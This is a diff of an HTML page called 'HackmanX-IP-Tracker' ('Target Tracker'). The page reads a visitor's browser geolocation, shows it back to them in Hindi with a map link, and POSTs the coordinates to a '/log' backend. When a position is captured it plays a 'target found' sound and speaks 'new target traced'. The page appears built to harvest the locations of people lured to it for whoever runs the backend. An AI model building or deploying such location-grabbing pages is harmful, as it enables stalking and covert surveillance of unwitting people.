@@ -1,25 +1,64 @@
 <!DOCTYPE html>
-<html>
+<html lang="hi">
 <head>
+  <meta charset="UTF-8">
   <title>HackmanX-IP-Tracker</title>
   <link rel="stylesheet" href="/static/style.css">
+  <style>
+    body {
+      background-color: black;
+      color: lime;
+      font-family: monospace;
+      text-align: center;
+      padding-top: 50px;
+    }
+    #location {
+      margin-top: 20px;
+      font-size: 1.2em;
+    }
+    #map-link {
+      margin-top: 10px;
+      display: block;
+      color: cyan;
+    }
+  </style>
 </head>
 <body>
   <h1>🎯 Target Tracker</h1>
   <button onclick="getLocation()">🔍 Track</button>
+
+  <p id="location">📍 स्थान प्राप्त किया जा रहा है...</p>
+  <a id="map-link" href="#" target="_blank"></a>
+
   <script>
     function getLocation() {
       navigator.geolocation.getCurrentPosition(pos => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+
+        // Show location on screen
+        document.getElementById("location").innerText =
+          "📍 आपका स्थान: " + lat + ", " + lon;
+
+        // Show Google Maps link
+        document.getElementById("map-link").innerText = "🗺️ Google Map पर देखें";
+        document.getElementById("map-link").href = `https://www.google.com/maps?q=${lat},${lon}`;
+
+        // Send to backend
         fetch('/log', {
           method: 'POST',
           headers: {'Content-Type': 'application/json'},
-          body: JSON.stringify({
-            lat: pos.coords.latitude,
-            lon: pos.coords.longitude
-          })
+          body: JSON.stringify({ lat: lat, lon: lon })
         });
+
+        // Play sound
         let audio = new Audio('/static/sound/target_found.mp3');
         audio.play();
+
+        // Hindi narration
+        let speech = new SpeechSynthesisUtterance("नया लक्ष्य ट्रेस किया गया");
+        speech.lang = "hi-IN";
+        window.speechSynthesis.speak(speech);
       });
     }
   </script>
